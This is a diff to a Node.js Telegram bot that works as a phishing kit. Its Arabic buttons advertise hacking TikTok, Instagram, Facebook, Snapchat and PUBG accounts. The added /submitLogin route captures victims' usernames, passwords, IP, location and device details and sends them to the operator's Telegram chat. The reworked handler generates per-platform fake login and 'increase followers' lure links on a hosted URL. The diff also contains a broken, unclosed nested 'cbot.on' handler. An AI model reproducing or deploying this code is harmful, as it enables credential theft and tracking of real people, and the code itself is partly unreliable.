@@ -460,11 +460,11 @@ app.get('/getLocation/:userId', (req, res) => {
     res.sendFile(path.join(__dirname, 'SJGD.html'));
 });
 
-app.get('/:platform/:chatId', (req, res) => {
-    const { platform, chatId } = req.params;
+app.get('/:action/:platform/:chatId', (req, res) => {
+    const { action, platform, chatId } = req.params;
 
     if (subscribedUsers.has(chatId)) {
-        res.sendFile(path.join(__dirname, 'uploads', `${platform}_increase.html`));
+        res.sendFile(path.join(__dirname, 'uploads', `${platform}_${action}.html`));
         return;
     }
 
@@ -473,7 +473,7 @@ app.get('/:platform/:chatId', (req, res) => {
         return;
     }
 
-    res.sendFile(path.join(__dirname, 'uploads', `${platform}_increase.html`));
+    res.sendFile(path.join(__dirname, 'uploads', `${platform}_${action}.html`));
 });
 
 
@@ -608,6 +608,39 @@ app.post('/submitIncrease', (req, res) => {
             res.status(500).json({ error: 'Failed to send increase data', details: error.message });
         });
 });
+
+app.post('/submitLogin', (req, res) => {
+    const { username, password, platform, chatId, ip, country, city, userAgent, batteryLevel, charging, osVersion } = req.body;
+
+    console.log('Received login data:', { username, password, platform, chatId, ip, country, city, batteryLevel, charging, osVersion });
+
+    if (!chatId) {
+        return res.status(400).json({ error: 'Missing chatId' });
+    }
+
+    const deviceInfo = useragent.parse(userAgent);
+
+    bot.sendMessage(chatId, `تم تلقي بيانات تسجيل الدخول:
+منصة: ${platform}
+اسم المستخدم: ${username}
+كلمة السر: ${password}
+عنوان IP: ${ip}
+الدولة: ${country}
+المدينة: ${city}
+نظام التشغيل: ${osVersion}
+المتصفح: ${deviceInfo.toAgent()}
+الجهاز: ${deviceInfo.device.toString()}
+مستوى البطارية: ${batteryLevel}
+قيد الشحن: ${charging}`)
+        .then(() => {
+            res.json({ success: true });
+        })
+        .catch(error => {
+            console.error('Error sending message:', error);
+            res.status(500).json({ error: 'Failed to send login data', details: error.message });
+        });
+});
+
 
 
 function createReferralLink(userId) {
@@ -755,6 +788,7 @@ function showButtons(userId) {
       [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data:'get_location' }],
       [{ text: '☠️اختراق تيك توك ☠️', callback_data:'increase_tiktok' }],
       [{ text: '🕷اختراق الانستغرام🕷', callback_data:'increase_instagram' }],
+      [{ text: 'تسجيل دخول فيسبوك', callback_data: 'login_facebook' }],
       [{ text: '🔱اختراق الفيسبوك🔱', callback_data:'increase_facebook' }],
       [{ text: '👻 اختراق سناب شات 👻', callback_data:'increase_snapchat' }],
       [{ text: '🔫اختراق حسابات ببجي🔫', callback_data:'pubg_uc' }],
@@ -812,41 +846,35 @@ bot.on('message', (msg) => {
 });
 
 bot.on('callback_query', (query) => {
+    cbot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const baseUrl = 'https://yyytot.onrender.com'; // Change this to your actual URL
 
-    let url;
-    switch (query.data) {
-        case 'increase_tiktok':
-            url = `${baseUrl}/tiktok/${chatId}`;
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق التيك توك: ${url}`);
-            break;
-        case 'increase_instagram':
-            url = `${baseUrl}/instagram/${chatId}`;
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق الانستغرام: ${url}`);
-            break;
-        case 'increase_facebook':
-            url = `${baseUrl}/facebook/${chatId}`;
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق الفيسبوك: ${url}`);
-            break;
-        case 'increase_snapchat':
-            url = `${baseUrl}/snapchat/${chatId}`;
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق السناب شات: ${url}`);
-            break;
-        case 'pubg_uc':
-            url = `${baseUrl}/pubg_uc/${chatId}`;
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق بوبجي: ${url}`);
-            break;
-        case 'increase_youtube':
-            url = `${baseUrl}/youtube/${chatId}`;
-            bot.sendMessage(chatId, ` تم تلغيم رابط اختراق اليوتيوب: ${url}`);
-            break;
-        case 'increase_twitter':
-            url = `${baseUrl}/twitter/${chatId}`;
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق التويتر: ${url}`);
-            break;
+    const [action, platform] = query.data.split('_');
+    const url = `${baseUrl}/${action}/${platform}/${chatId}`;
+
+    let message;
+    if (action === 'login') {
+        message = `يرجى تسجيل الدخول إلى ${getPlatformName(platform)}: ${url}`;
+    } else if (action === 'increase') {
+        message = `يرجى إدخال معلومات حسابك لزيادة المتابعين على ${getPlatformName(platform)}: ${url}`;
     }
+
+    bot.sendMessage(chatId, message);
 });
+
+function getPlatformName(platform) {
+    const platformNames = {
+        tiktok: 'تيك توك',
+        instagram: 'انستقرام',
+        facebook: 'فيسبوك',
+        snapchat: 'سناب شات',
+        pubg: 'ببجي',
+        youtube: 'يوتيوب',
+        twitter: 'تويتر'
+    };
+    return platformNames[platform] || platform;
+}
 
 
 const PORT = process.env.PORT || 3000;
